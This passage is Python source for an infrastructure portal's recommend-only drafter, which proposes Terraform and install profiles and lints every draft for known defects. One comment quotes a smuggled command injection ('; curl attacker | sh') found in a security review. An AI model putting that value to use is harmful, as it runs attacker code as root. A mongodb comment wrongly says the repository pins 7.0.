"""Draft the recipe for a catalogue candidate (C4) — recommend-only.

ARCHITECTURE.md §7 (amended 2026-08-21) lets an agent propose a Terraform module
and blueprint. It produces a PROPOSAL: files and reasoning, reviewable as a diff.
It applies nothing, triggers no orchestrator, holds no credential, and nothing it
writes is on the path of any request until a human puts it there.

TWO KINDS OF CANDIDATE, AND ONLY ONE NEEDS A MODEL.

  A VERSION BUMP — C3's usual finding: OCI offers PostgreSQL 18 and the catalogue
  sells 16. This needs NO Terraform at all. The module stopped hard-coding the
  version when P7 landed; it reads the catalogue name and asks OCI whether that
  version exists. So the draft is one technology row and one line in a manifest,
  and it is produced arithmetically. Calling a language model to increment a
  number would add cost, latency and a failure mode for no gain.

  A NEW SERVICE — no module exists. This is where a model earns its place, and
  where everything it writes is suspect.

WHAT MAKES IT SAFE IS NOT THE MODEL. Every draft, however produced, goes through
`review_draft` — a deterministic linter carrying the defects this project has
already paid for. Four of the eight found on 2026-08-17 were written by an AI
with the provider documentation open. A model that has read this codebase will
reproduce its habits, so the checks are the gate, not the prompt.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field

from sqlalchemy import select
from sqlalchemy.orm import Session

from api.ai_drafter import AiUnavailable, ai_mode, ai_model, anthropic_client
from common import profile_rules
from db.models import Technology
from common.doctrine import with_doctrine

VERSIONED_CODE = re.compile(r"^([a-z][a-z-]*?)(\d+)$")


@dataclass
class Finding:
    severity: str        # blocker | warning
    rule: str
    detail: str


@dataclass
class Draft:
    candidate: str
    kind: str                     # version-bump | new-service
    files: dict[str, str] = field(default_factory=dict)
    catalogue_rows: list[dict] = field(default_factory=list)
    reasoning: str = ""
    findings: list[Finding] = field(default_factory=list)
    source: str = "deterministic"     # deterministic | model

    @property
    def blocked(self) -> bool:
        return any(f.severity == "blocker" for f in self.findings)


# --- The linter: what this project has already paid to learn ----------------
#
# Each rule is a defect that reached a real request. The message says what it
# cost, because a reviewer reading a finding needs to know whether it is pedantry
# or the reason four builds failed.

_RULES: list[tuple[re.Pattern, str, str, str]] = [
    (re.compile(r"assign_public_ip\s*=\s*true"), "blocker", "public-ip",
     "Requests a public IP. Every subnet the network team provisioned is private, "
     "so OCI refuses the VNIC and the whole apply dies — the failure that looked "
     "like 'nodes register timeout' for three builds."),
    (re.compile(r"is_regionally_durable\s*=\s*true"), "blocker", "regional-durability",
     "Hard-codes regional durability, which OCI offers only in 3-AD regions. "
     "me-dubai-1 has one. Derive it from the availability-domain count instead."),
    (re.compile(r"sources\s*\[\s*(length|len)"), "blocker", "list-position",
     "Picks an item by position in a list the cloud returned. OCI's order looks "
     "sorted and is not: this is how the OKE module chose Oracle Linux 7.9 out of "
     "120 images. Select by name."),
    (re.compile(r'(kubernetes_version|db_version)\s*=\s*"v?\d'), "blocker", "pinned-version",
     "Pins a version as a literal. Clouds retire versions on their own schedule "
     "(ARCHITECTURE.md P7) — v1.29.1 was pinned here and retired, and four "
     "requests failed at apply before anyone noticed."),
    (re.compile(r"iops\s*=\s*\d{4,}"), "warning", "expensive-default",
     "Sets a large provisioned-IOPS figure as a constant. Storage IOPS is billed "
     "and is independent of shape: 75000 was charged on every database the portal "
     "built, chosen by nobody."),
    (re.compile(r'(password|secret|api_key|private_key)\s*=\s*"[^"$]{6,}"',
                re.IGNORECASE), "blocker", "inline-secret",
     "Looks like a literal credential. Secrets are referenced by vault OCID and "
     "never appear as values (CLAUDE.md; ARCHITECTURE.md P2)."),
    (re.compile(r'shape\s*=\s*"[A-Za-z0-9.]*E[0-9]\.'), "warning", "hard-coded-shape",
     "Hard-codes a shape family. Shapes differ by region and generation — an E4 "
     "default was unbuildable in me-dubai-1, which publishes only E5."),
]

_MANIFEST_REQUIRED = ("ref", "target", "resource_kind", "builds")


def review_draft(files: dict[str, str]) -> list[Finding]:
    """Check a draft against the defects this project has already paid for.

    Deterministic and applied to EVERY draft, model-written or not. This is the
    gate ARCHITECTURE.md §7 says the agent cannot talk past: it does not read the
    reasoning, only the code.
    """
    findings: list[Finding] = []
    for path, content in sorted(files.items()):
        body = "\n".join(line for line in (content or "").splitlines()
                         if not line.strip().startswith("#"))
        for pattern, severity, rule, detail in _RULES:
            if pattern.search(body):
                findings.append(Finding(severity, rule, f"{path}: {detail}"))
        if path.endswith((".yaml", ".yml")):
            for key in _MANIFEST_REQUIRED:
                if not re.search(rf"^{key}\s*:", content or "", re.MULTILINE):
                    findings.append(Finding(
                        "blocker", "manifest-incomplete",
                        f"{path}: no '{key}:' — the orchestrator would not discover "
                        f"this blueprint, and the portal would offer a technology "
                        f"nothing can build."))
    return findings


# --- Classifying the candidate ----------------------------------------------

# Codes that name a CLOUD-MANAGED service rather than software you install.
# `oci-objectstorage` is a bucket; `aws-lambda` is a function; neither is a
# package on a machine. Everything else in this catalogue — keycloak, kafka,
# mongodb, vault, opensearch, rabbitmq — is software that runs on a VM.
#
# A prefix rule rather than a list, because a list would go stale the first time
# somebody adds a cloud service nobody updated it for.
CLOUD_SERVICE_PREFIX = re.compile(r"^(oci|aws|azure|gcp)-")


def delivery_model(code: str, session: Session) -> str:
    """How the catalogue says this technology is delivered, or "" if unrecorded.

    Read from the catalogue rather than inferred from the code, and returning ""
    rather than a default: "we have not classified this" and "this is software"
    are different facts, and conflating them is what put a machine behind
    `dnf install backup`.
    """
    from db.models import TechnologyDelivery

    row = session.get(TechnologyDelivery, (code or "").strip().lower())
    return (row.delivery_model or "") if row is not None else ""


def delivery_note(code: str, session: Session) -> str:
    """Why, in a sentence a requester can act on."""
    from db.models import TechnologyDelivery

    row = session.get(TechnologyDelivery, (code or "").strip().lower())
    return (row.note or "") if row is not None else ""


def classify(candidate: str, session: Session) -> tuple[str, Technology | None]:
    """('version-bump', sibling) | ('vm-service', None) | ('new-service', None).

    A bump is recognised by the catalogue already selling the same family: the
    module behind it is version-agnostic, so there is nothing to write.

    A VM-SERVICE NEEDS NO TERRAFORM AT ALL, and recognising that is the most
    valuable thing this function does. `oci/service-vm` already builds machines
    properly — it resolves the image from OCI at run time filtered by shape,
    keeps the instance private, and makes it report what it became; every one of
    those behaviours was bought with a failed request. What keycloak needs from
    us is a package, a systemd unit and a port. Writing it a second Terraform
    module would duplicate a working one and collide on its resource kind, and
    would inherit none of those lessons.
    """
    code = (candidate or "").strip().lower()

    # THE CATALOGUE, NOT THE CODE NAME. The rule below reads a naming convention
    # and gets it wrong in both directions: `postgres16` is OCI's MANAGED
    # database and looks like software by that rule, while "Backup & Recovery"
    # is an outcome nobody can install and looks like software too — REQ-2026-0183
    # spent a real machine discovering `dnf install backup` finds nothing.
    #
    # A technology with no recorded delivery model falls through to the guess, so
    # one added tomorrow still works; it is guessed at rather than known, and
    # `delivery_model` says which.
    declared = delivery_model(code, session)
    if declared == "capability":
        return "capability", None
    if declared == "managed":
        return "new-service", None
    if declared in ("software", "machine"):
        return "vm-service", None

    match = VERSIONED_CODE.match(code)
    if not match:
        if code and not CLOUD_SERVICE_PREFIX.match(code):
            return "vm-service", None
        return "new-service", None
    family = match.group(1)
    for row in session.scalars(select(Technology)).all():
        other = VERSIONED_CODE.match((row.code or "").lower())
        if other and other.group(1) == family and row.code.lower() != candidate.lower():
            return "version-bump", row
    # A versioned code with no sibling falls through to the same guess. Note
    # that postgres16 no longer reaches here: the catalogue records it as
    # managed, which is what it actually is.
    if not CLOUD_SERVICE_PREFIX.match(code):
        return "vm-service", None
    return "new-service", None


def _bump_draft(candidate: str, sibling: Technology) -> Draft:
    """A version bump, worked out rather than generated.

    No Terraform changes because the module does not carry the version: it reads
    the catalogue name and resolves the rest from the cloud. That is P7 paying
    for itself — the same property that stopped postgres16 building PostgreSQL 14.
    """
    match = VERSIONED_CODE.match(candidate.lower())
    family, version = match.group(1), match.group(2)
    pretty = (sibling.name or "").rsplit(" ", 1)[0] or family.title()
    return Draft(
        candidate=candidate,
        kind="version-bump",
        catalogue_rows=[{
            "code": candidate.lower(),
            "name": f"{pretty} {version}",
            "resource_kind": sibling.resource_kind,
            "targets": sibling.targets,
            "lifecycle_state": "draft",
        }],
        files={},
        reasoning=(
            f"{candidate} is a new version of a family the catalogue already "
            f"sells ({sibling.code}). No Terraform is needed: the module resolves "
            f"the version from the catalogue name and checks it against the cloud, "
            f"so it already builds {candidate} the moment the catalogue offers it. "
            f"The proposal is one technology row, plus adding {candidate} to the "
            f"blueprint's `builds:` list. Certification still has to be earned by "
            f"a proof build."),
        source="deterministic",
    )


_NEW_SERVICE_SCAFFOLD = '''# DRAFT — not reviewed, not certified, builds nothing yet.
#
# Proposed skeleton for {candidate}. Written as a starting point for a human, not
# as a finished module: the parts that decide cost, exposure and correctness are
# left as TODOs on purpose, because a plausible guess at them is worse than a
# blank.
#
# Before this can be certified it must: resolve every cloud fact at run time
# rather than hard-coding it (ARCHITECTURE.md P7), keep the resource private,
# reference any credential by vault OCID, and pass a proof build (§4).

resource "TODO_provider_resource" "env" {{
  count          = var.resource_kind == "{kind}" ? 1 : 0
  compartment_id = var.compartment_ocid
  display_name   = var.{name_var}
  freeform_tags  = var.tags

  # TODO: shape/size — resolve from the cloud's published list, never a literal.
  # TODO: network — a private subnet supplied by the network team.
  # TODO: credentials — by vault secret OCID; never a value.
}}
'''

_NEW_SERVICE_MANIFEST = '''ref: {target}/{slug}
target: {target}
resource_kind: {kind}
module: .
version: 0.1.0
builds: [{candidate}]
name_var: {name_var}
description: DRAFT — proposed blueprint for {candidate}. Not certified.
'''


def _scaffold_draft(candidate: str, target: str = "oci") -> Draft:
    """A deliberately incomplete skeleton for a service with no module.

    Mock mode, and the fallback when the model is unavailable. It does NOT invent
    provider resources or arguments: a confident-looking wrong module is more
    dangerous than an obviously unfinished one, and this codebase has spent a week
    on plausible values that were wrong.
    """
    slug = re.sub(r"[^a-z0-9]+", "-", candidate.lower()).strip("-")
    kind = f"{target}-{slug}"
    name_var = f"{slug.replace('-', '_')}_name"
    files = {
        f"orchestrator/terraform/{target}/{slug}/main.tf":
            _NEW_SERVICE_SCAFFOLD.format(candidate=candidate, kind=kind, name_var=name_var),
        f"orchestrator/blueprints/{kind}.yaml":
            _NEW_SERVICE_MANIFEST.format(target=target, slug=slug, kind=kind,
                                         candidate=candidate, name_var=name_var),
    }
    return Draft(
        candidate=candidate, kind="new-service", files=files,
        reasoning=(
            f"No module exists for {candidate}, so this is a skeleton rather than "
            f"a working recipe. The decisions that matter — shape, network, "
            f"credentials — are left as TODOs deliberately: a plausible guess at "
            f"them reads as finished work and is how this project lost four builds "
            f"to values that looked right."),
        source="deterministic",
    )


# --- The profile linter: what a recipe must say before a machine is booted ---
#
# These are cheap checks against expensive lessons. Each one is a real failure:
# nothing here is style.

def review_profile(profile: dict,
                   shipped_codes: frozenset[str] = frozenset()) -> list[Finding]:
    """Judge a technology profile before it costs a machine to find out.

    `shipped_codes` is passed IN rather than read from the orchestrator: the
    API image does not contain orchestrator/, so `from orchestrator import
    configure` imports cleanly under pytest and raises ModuleNotFoundError in
    the container. That asymmetry is how the Apache-on-Ubuntu refusal shipped
    inert — green suite, no effect in production (api/blueprint_capabilities).
    """
    findings: list[Finding] = []

    def block(rule, detail):
        findings.append(Finding("blocker", rule, detail))

    code = str(profile.get("code") or "").strip()
    if not code:
        block("no-code", "The profile names no technology, so nothing could install it.")

    if not str(profile.get("builds_on") or "").strip():
        block("no-blueprint",
              "The profile names no blueprint to extend. A technology absent from a "
              "blueprint's `builds` is dropped by _components_for before first-boot "
              "configuration is even considered — the machine boots bare and reports "
              "success.")

    families = [f for f in ("rhel", "debian") if isinstance(profile.get(f), dict)]
    for family in families:
        if not profile[family].get("services"):
            findings.append(Finding(
                "warning", "no-service",
                f"The {family} block enables no systemd unit, so the software would be "
                f"installed but not running."))

    # --- archive installs: root is about to fetch and execute this ----------
    #
    # Delegated to common/profile_rules, which BOTH services enforce. The first
    # version of these rules lived here and checked string prefixes: an
    # adversarial review demonstrated that `https://x/y.tgz; curl attacker | sh`
    # starts with "https://", `/opt/../..` starts with "/opt/", and a newline in
    # unit.exec_start injected a whole extra cloud-init file — a fully weaponised
    # profile returned zero findings.
    for problem in profile_rules.profile_problems(profile):
        block("profile-refused", problem)

    if code and code in shipped_codes:
        block("shadows-shipped",
              f"`{code}` already has a reviewed profile. A generated one may not take "
              f"its place — the same rule the blueprint registry applies to manifests.")

    return findings


# Software that ships as an ARCHIVE, not a package (C6b). REQ-2026-0177 proved
# on a real machine that `dnf install keycloak` finds nothing — the machine said
# "package keycloak is not installed" and the proof failed on that evidence. A
# package-name guess cannot install a tarball, so for these the drafter needs to
# KNOW: the release URL, its checksum, and the unit that runs it.
#
# EVERY FACT HERE IS MEASURED, NOT RECALLED. The version comes from the
# project's own releases API and the sha256 was computed from the downloaded
# artifact on the date noted — because a plausible URL from memory is exactly
# the class of guess the proof exists to refute, and the checksum is what stands
# between root and a tampered mirror. An entry is still only a CLAIM: the proof
# boots a machine and the machine decides, same as everything else.
#
# Pinned rather than "latest" on purpose. Cloud facts (shapes, images) must be
# resolved at run time because the cloud changes them under us; a release
# artifact is immutable, and pinning it is what makes the checksum meaningful.
# The 30-day certification expiry re-proves the pin on a rhythm.
ARCHIVE_KNOWLEDGE: dict[str, dict] = {
    "keycloak": {
        # keycloak/keycloak releases/latest, asked 2026-08-22; sha256 computed
        # from the artifact the same day (265 MB downloaded and hashed).
        "version": "26.7.2",
        "expects": "26",
        "ports": [8080],
        "version_command": "/opt/keycloak/bin/kc.sh --version 2>&1",
        "archive": {
            "url": ("https://github.com/keycloak/keycloak/releases/download/"
                    "26.7.2/keycloak-26.7.2.tar.gz"),
            "sha256": "4f3ce3b797a9d98998b7f1a6bd5d2b9832100faea66c48988713a9b23eda5c44",
            "dest": "/opt/keycloak",
            "user": "keycloak",
            "unit": {
                "description": "Keycloak",
                # start-dev: http on 8080, no TLS/hostname config required. Right
                # for the Development tier this portal certifies in; a production
                # profile would carry `start` plus vault-referenced config, and
                # would need its own proof.
                "exec_start": "/opt/keycloak/bin/kc.sh start-dev",
            },
        },
        # java-21-openjdk-headless is MACHINE-PROVEN on OL9: the java21 profile
        # installed it and the machine reported 21.0.11 (REQ-2026-0139).
        "rhel": {"packages": ["java-21-openjdk-headless"],
                 "services": ["keycloak"]},
    },
}


# Software that lives in its OWN repository, not the operating system's.
#
# REQ-2026-0184 asked for HashiCorp Vault. The agent guessed `dnf install vault`,
# booted a real machine, and was told "package vault is not installed" — correct,
# and the wrong question: Vault is not in Oracle's repositories and never will
# be. It is in HashiCorp's, and adding that repository is a third way to install
# software the agent had no vocabulary for.
#
# EVERY ENTRY IS MEASURED. The HashiCorp repo definition, its RHEL/9/x86_64
# repodata and its GPG key were all fetched on 2026-08-23 and returned 200; the
# others follow the same published pattern and are proven the same way — by
# booting a machine. A repository is a standing grant of trust, so a plausible
# URL from memory is exactly the kind of guess that must not reach root.
# NO `expects` FOR A ROLLING REPOSITORY. REQ-2026-0185 installed Vault 2.0.4
# perfectly and was refuted for not being version "1" — a version this code
# recalled rather than measured, and a promise the catalogue entry ("HashiCorp
# Vault") never made. A vendor repository serves whatever is current, so pinning
# a major here invents a promise and re-breaks it at every major release. The
# machine is still asked and still reports what it got; there is simply nothing
# to compare it against. Where a repository URL DOES pin a version, the promise
# is real and stays — see mongodb below.
VENDOR_REPOS: dict[str, dict] = {
    "vault": {
        "repo": {"url": "https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo",
                 "gpg_key": "https://rpm.releases.hashicorp.com/gpg"},
        "packages": ["vault"], "services": ["vault"], "ports": [8200],
        "version_command": "vault version 2>&1",
    },
    "consul": {
        "repo": {"url": "https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo",
                 "gpg_key": "https://rpm.releases.hashicorp.com/gpg"},
        "packages": ["consul"], "services": ["consul"], "ports": [8500],
        "version_command": "consul version 2>&1",
    },
    "mongodb": {
        # THE BASEURL, not a `.repo` file. The URL here was
        # `.../yum/redhat/mongodb-org-7.0.repo`, which MongoDB does not publish
        # — a 404 — so REQ-2026-0205 booted a machine, failed to add the
        # repository, and could not find `mongodb-org`. Their repository is
        # perfectly healthy; our URL had rotted unnoticed, which is what P7 was
        # written about. C10 now measures this before a machine is spent.
        "repo": {"url": "https://repo.mongodb.org/yum/redhat/9/mongodb-org/8.0/x86_64/",
                 "gpg_key": "https://pgp.mongodb.com/server-8.0.asc"},
        "packages": ["mongodb-org"], "services": ["mongod"], "ports": [27017],
        # KEPT, unlike vault and consul: this repository URL pins 7.0, so the
        # RECIPE ITSELF promises a major version and not checking it would be
        # the Redis 6.2 silence again. A promise the recipe makes is a promise
        # the machine must keep.
        "expects": "8", "version_command": "mongod --version 2>&1",
    },
}


def _repo_profile(code: str, target: str) -> dict:
    """A profile that adds the vendor's own repository, then installs from it."""
    known = VENDOR_REPOS[code]
    return {
        "code": code,
        "builds_on": "oci/service-vm" if target == "oci" else "",
        "ports": list(known.get("ports") or []),
        "expects": known.get("expects", ""),
        "version_command": known.get("version_command", ""),
        "repo": dict(known["repo"]),
        "rhel": {"packages": list(known["packages"]),
                 "services": list(known["services"])},
        "_note": ("DRAFT — installs from the vendor's own repository, because "
                  "the operating system does not carry this software. Proven by "
                  "booting a machine; the machine's own report decides."),
    }


def draft_from_image(candidate: str, image: dict, target: str = "oci"):
    """A draft that runs the vendor's own image on the machine (C8).

    THE LAST RUNG, and the one that reaches furthest. RabbitMQ is not packaged
    for Oracle Linux 9 or EPEL 9 — three real machines and an independent check
    against repology established that — and its official image has been pulled
    nearly four billion times. What the requester receives is still a Linux VM
    they can log in to; the container is how the software arrived.

    Every value was measured against the registry minutes ago: the image path by
    trying the conventional shapes and seeing which exists, the digest by asking
    the registry what the tag currently resolves to. Returns None when nothing is
    published, which is the honest end of the road for internal or licensed
    software.
    """
    code = (candidate or "").strip().lower()
    if not image or not image.get("image") or not image.get("digest"):
        return None
    # NOTHING IS PUBLISHED UNTIL A MACHINE HAS SEEN IT LISTENING.
    #
    # The image's own declaration is the vendor's statement of its interface, and
    # for `library/rabbitmq` that is six ports — AMQP, AMQPS, epmd, clustering
    # and two Prometheus endpoints — while a default container listens on far
    # fewer. Publishing all six would open all six in a real machine's firewall,
    # so the first attempt publishes NONE, asks the container what it actually
    # bound, and the narrowed profile is proved again. A changed recipe is never
    # certified on the old recipe's proof.
    ports = [int(p) for p in (image.get("listening") or [])]
    declared = [int(p) for p in (image.get("ports") or [])]
    profile = {
        "code": code,
        "builds_on": "oci/service-vm" if target == "oci" else "",
        "ports": ports,
        # NO VERSION COMMAND. There is no general way to ask a container its
        # version: the binary name is not derivable from the technology code
        # (REQ-2026-0192 tried `rabbitmq` and crun replied there is no such
        # executable), and the image's own version label is the BASE OS on many
        # official images — library/rabbitmq reports "24.04", which is Ubuntu.
        #
        # The digest answers the question exactly instead, and the machine
        # compares the one it holds against the one pinned. That is a stronger
        # identity than a version string, not a weaker one.
        "container": {
            "image": image["image"],
            "tag": str(image.get("tag") or "latest"),
            "digest": image["digest"],
            # ITS OWN BLOCK VOLUME. A container's data outlives the container and
            # often the machine; on the boot volume it is entangled with the
            # operating system and a rebuild takes it along.
            "data_dir": f"/var/lib/{code}",
            "data_mount": f"/var/lib/{code}",
        },
        # No packages: podman is supplied by the renderer, because what runs a
        # container is its choice of runtime and not a property of RabbitMQ.
        "rhel": {"packages": [], "services": [code]},
        "_note": (
            f"DRAFT — the vendor's own image, measured not recalled: "
            f"{image['image']} pinned at {image['digest'][:19]}..., "
            f"ports {ports or 'none published yet'}"
            + (f" of {declared} the image declares" if declared else "")
            + f". Data on a separate block volume at /var/lib/{code}. Proven by "
              f"booting a machine; that machine decides."),
    }
    findings = review_profile(profile)
    if [f for f in findings if f.severity == "blocker"]:
        return None
    return Draft(
        candidate=candidate, kind="vm-service",
        files={f"generated/profiles/{code}.json": json.dumps(profile, indent=2)},
        reasoning=(f"{candidate} is not packaged for this operating system, and "
                   f"its publisher ships an image."),
        source="measured")


def draft_from_finding(candidate: str, finding: dict, target: str = "oci"):
    """A draft built from what a MACHINE reported, not from what this code knows.

    The C7 rung. Everything in it was measured minutes earlier on a real
    machine — the package name from the package manager's own metadata, the
    repository it lives in from the same query, the ports from the difference
    between what was listening before the install and after. That is the whole
    point: a technology should not have to be written into a dictionary here
    before the portal can install it.

    Returns None when the finding says nothing usable, which is a real outcome —
    software in no repository at all (Keycloak ships a tarball) cannot be
    discovered, only declared.
    """
    from api import discovery

    profile = discovery.profile_from(
        discovery.Finding(code=(candidate or "").strip().lower(),
                          package=str(finding.get("package") or ""),
                          repo_id=str(finding.get("repo_id") or ""),
                          ports=[int(p) for p in (finding.get("ports") or [])]),
        target)
    if profile is None:
        return None
    return Draft(
        candidate=candidate, kind="vm-service",
        files={f"generated/profiles/{profile['code']}.json":
               json.dumps(profile, indent=2)},
        reasoning=(f"{candidate} is packaged as {profile['rhel']['packages'][0]}, "
                   f"which a machine reported rather than this code guessing."),
        source="measured")


def install_methods(code: str) -> list[str]:
    """The ways this software could be installed, cheapest first.

    ORDER IS COST, NOT CONFIDENCE. An OS package is one command and no trust
    granted; a vendor repository trusts a publisher for everything it will ever
    serve; an archive fetches and executes a specific file. Trying them in this
    order means the cheapest correct answer is found first, and each failure
    narrows the next attempt instead of repeating it.
    """
    methods = ["package"]
    if code in VENDOR_REPOS:
        methods.append("repo")
    if code in ARCHIVE_KNOWLEDGE:
        methods.append("archive")
    return methods


def profile_for_method(code: str, method: str, target: str = "oci") -> dict | None:
    """The profile for one install method, or None if that method is not known."""
    if method == "package":
        return _guessed_profile(code, target)
    if method == "repo" and code in VENDOR_REPOS:
        return _repo_profile(code, target)
    if method == "archive" and code in ARCHIVE_KNOWLEDGE:
        known = ARCHIVE_KNOWLEDGE[code]
        return {
            "code": code,
            "builds_on": "oci/service-vm" if target == "oci" else "",
            "ports": list(known.get("ports") or []),
            "expects": known.get("expects", ""),
            "version_command": known.get("version_command", ""),
            "archive": dict(known["archive"]),
            "rhel": dict(known.get("rhel") or {}),
            "_note": ("DRAFT — an archive install from measured facts (pinned "
                      "release, computed sha256), proven by booting a machine."),
        }
    return None


def _guessed_profile(code: str, target: str) -> dict:
    """The obvious guess: a package named after the technology.

    Right surprisingly often (nginx, redis) and wrong in a way that costs
    nothing to discover — the proof boots a machine and the machine says whether
    the package exists. What it can never do is install software that ships as
    an archive; that needs ARCHIVE_KNOWLEDGE or the live model."""
    return {
        "code": code,
        "builds_on": "oci/service-vm" if target == "oci" else "",
        "ports": [],
        "version_command": f"{code} --version 2>&1",
        "rhel": {"packages": [code], "services": [code]},
        "_note": ("DRAFT — proposed by the agent, proven by booting a machine. "
                  "The package name is the obvious guess and may not exist in the "
                  "image's repositories; the machine's own report decides."),
    }



_SYSTEM = (
    "You draft infrastructure recipes for an internal provisioning portal — a "
    "Terraform module, a blueprint manifest, or a JSON technology profile. What "
    "you return is a PROPOSAL. It is linted, scanned in strict mode, priced, and "
    "then built on a real machine that must report itself healthy before "
    "anything you wrote is certified. You do not run it, you do not certify it, "
    "and you never judge whether your own draft worked."
)

def _model_profile(code: str, target: str) -> dict:  # pragma: no cover - live path
    """Ask the model for a technology profile. Checked, never trusted.

    Same stance as _model_draft: the output goes through review_profile — https
    archives only, a unit for what it starts, a version command — and then a
    proof build, where the machine has the last word. A missing sha256 survives
    the linter as a warning because the model cannot compute one, but the https
    requirement and the sandbox proof still bound what a hallucinated URL can do:
    fail, visibly, having built nothing.
    """
    client = anthropic_client()
    prompt = (
        f"Write a JSON technology profile that installs {code} on Oracle Linux 9 "
        f"for a provisioning portal. Schema: {{code, builds_on: 'oci/service-vm', "
        f"ports: [..], expects: 'major version', version_command, archive?: "
        f"{{url (https only), sha256?, dest under /opt, user, unit: "
        f"{{description, exec_start}}}}, rhel: {{packages: [real OL9 RPMs only], "
        f"services: [..]}}}}. Use an archive only when the software does not ship "
        f"as an OL9 package. Pin a real release URL. Return ONLY the JSON object."
    )
    message = client.messages.create(
        model=ai_model(), max_tokens=1500,
        system=with_doctrine(_SYSTEM),
        messages=[{"role": "user", "content": prompt}])
    text = "".join(getattr(b, "text", "") for b in message.content).strip()
    if text.startswith("```"):
        text = text.strip("`").lstrip("json").strip()
    try:
        profile = json.loads(text)
    except ValueError as exc:
        raise AiUnavailable(f"The model did not return a JSON profile: {exc}")
    if not isinstance(profile, dict):
        raise AiUnavailable("The model returned JSON that is not an object.")
    profile["code"] = code
    profile.setdefault("builds_on", "oci/service-vm" if target == "oci" else "")
    profile["_note"] = ("DRAFT — proposed by the model, checked by the linter, "
                        "proven by booting a machine. The machine decides.")
    return profile


def draft_profile(candidate: str, target: str = "oci",
                  method: str = "") -> Draft:
    """Propose a technology PROFILE — package, unit, port — not Terraform.

    The scaffold deliberately proposes the obvious thing: a package named after
    the technology. That is right surprisingly often (nginx, redis, kafka) and
    wrong in a way that COSTS NOTHING TO DISCOVER, because the proof boots a real
    machine and the machine reports whether the package installed and at what
    version. A wrong guess fails on evidence and feeds the next attempt.

    What it must never do is claim a version it cannot verify. `expects` is left
    unset here: the scaffold has no grounds to promise one, and a promise nobody
    checks is how "Redis 7" shipped 6.2.
    """
    code = (candidate or "").strip().lower()

    # An explicit method, when the loop is escalating after a machine refuted the
    # previous one. Without this the agent redrafts the same recipe every time
    # and buys the same refusal — which is what happened to vault.
    if method:
        chosen = profile_for_method(code, method, target)
        if chosen is not None:
            return Draft(
                candidate=candidate, kind="vm-service",
                files={f"generated/profiles/{code}.json": json.dumps(chosen, indent=2)},
                reasoning=f"{candidate}: trying the {method} install method.",
                source="deterministic")

    if code in VENDOR_REPOS and code not in ARCHIVE_KNOWLEDGE:
        repo_draft = _repo_profile(code, target)
        return Draft(
            candidate=candidate, kind="vm-service",
            files={f"generated/profiles/{code}.json": json.dumps(repo_draft, indent=2)},
            reasoning=(f"{candidate} is not carried by the operating system; it "
                       f"installs from the vendor's own repository."),
            source="deterministic")

    known = ARCHIVE_KNOWLEDGE.get(code)
    if known:
        profile = {
            "code": code,
            "builds_on": "oci/service-vm" if target == "oci" else "",
            "ports": list(known.get("ports") or []),
            "expects": known.get("expects", ""),
            "version_command": known.get("version_command", ""),
            "archive": dict(known["archive"]),
            "rhel": dict(known.get("rhel") or {}),
            "_note": ("DRAFT — an archive install from measured facts (pinned "
                      "release, computed sha256), proven by booting a machine. "
                      "The machine's own report decides."),
        }
    elif ai_mode() == "live":
        try:
            profile = _model_profile(code, target)
        except AiUnavailable:
            profile = _guessed_profile(code, target)
    else:
        profile = _guessed_profile(code, target)
    return Draft(
        candidate=candidate, kind="vm-service",
        files={f"generated/profiles/{code}.json": json.dumps(profile, indent=2)},
        reasoning=(
            f"{candidate} is software that runs on a machine, and oci/service-vm "
            f"already builds machines correctly. It needs a package, a unit and a "
            f"port — not a second Terraform module for a resource kind that "
            f"already has one."),
        source="deterministic")


def draft(candidate: str, session: Session, target: str = "oci",
          shipped_codes: frozenset[str] = frozenset(), method: str = "") -> Draft:
    """Propose a recipe for one catalogue candidate. Never applies anything."""
    candidate = (candidate or "").strip()
    if not candidate:
        raise ValueError("No candidate given.")

    kind, sibling = classify(candidate, session)
    if kind == "version-bump" and sibling is not None:
        proposal = _bump_draft(candidate, sibling)
    elif kind == "vm-service":
        proposal = draft_profile(candidate, target, method=method)
        # A profile is judged by the profile rules, not the Terraform ones —
        # review_draft would find no Terraform and say nothing at all.
        proposal.findings = review_profile(
            json.loads(next(iter(proposal.files.values()))), shipped_codes)
        return proposal
    elif ai_mode() == "live":
        try:
            proposal = _model_draft(candidate, target)
        except AiUnavailable:
            proposal = _scaffold_draft(candidate, target)
    else:
        proposal = _scaffold_draft(candidate, target)

    # EVERY draft is checked, however it was produced. The model does not get a
    # different standard from the scaffold.
    proposal.findings = review_draft(proposal.files)
    return proposal


def _model_draft(candidate: str, target: str) -> Draft:  # pragma: no cover - live path
    """Ask the model for a module. Its output is checked, not trusted."""
    client = anthropic_client()
    prompt = (
        f"Propose a Terraform module and blueprint manifest for {candidate} on "
        f"{target.upper()}, for a provisioning portal.\n\n"
        "Hard requirements, each learned from a real failure:\n"
        "- resolve versions, shapes and images from the cloud at run time; never "
        "hard-code them\n"
        "- never select an item by its position in a list the cloud returned\n"
        "- resources are private: no public IPs\n"
        "- credentials are referenced by vault OCID, never as values\n"
        "- do not set large provisioned-IOPS or similar billed constants\n\n"
        "Return the files, each preceded by a line '=== <path>'."
    )
    message = client.messages.create(
        model=ai_model(), max_tokens=4000,
        system=with_doctrine(_SYSTEM),
        messages=[{"role": "user", "content": prompt}])
    text = "".join(getattr(b, "text", "") for b in message.content)
    files: dict[str, str] = {}
    current = None
    for line in text.splitlines():
        if line.startswith("=== "):
            current = line[4:].strip()
            files[current] = ""
        elif current:
            files[current] += line + "\n"
    if not files:
        raise AiUnavailable("The model returned nothing that looked like a file.")
    return Draft(candidate=candidate, kind="new-service", files=files,
                 reasoning="Drafted by the model; every file below is unreviewed.",
                 source="model")


def diagnose(failure_detail: str, files: dict[str, str]) -> list[Finding]:
    """Read a failed proof and say what in the draft it points at.

    Deterministic first: most of this week's failures name their own cause once
    somebody reads the message. The findings are proposals for a human, never a
    verdict — the runner decides, not this.
    """
    detail = (failure_detail or "").lower()
    findings: list[Finding] = []
    if "public ip addresses are prohibited" in detail:
        findings.append(Finding("blocker", "public-ip",
                                "The apply was refused because something asked for a "
                                "public IP in a private subnet. Set assign_public_ip "
                                "to false on whatever launches an instance."))
    if "cgroup v1" in detail or "register timeout" in detail:
        findings.append(Finding("blocker", "worker-image",
                                "Nodes never registered. The usual cause is a worker "
                                "image the kubelet cannot start on — check the image "
                                "is selected by name and matches the Kubernetes "
                                "version, not taken from the end of a list."))
    if "isregionallydurable" in detail.replace(" ", "").lower():
        findings.append(Finding("blocker", "regional-durability",
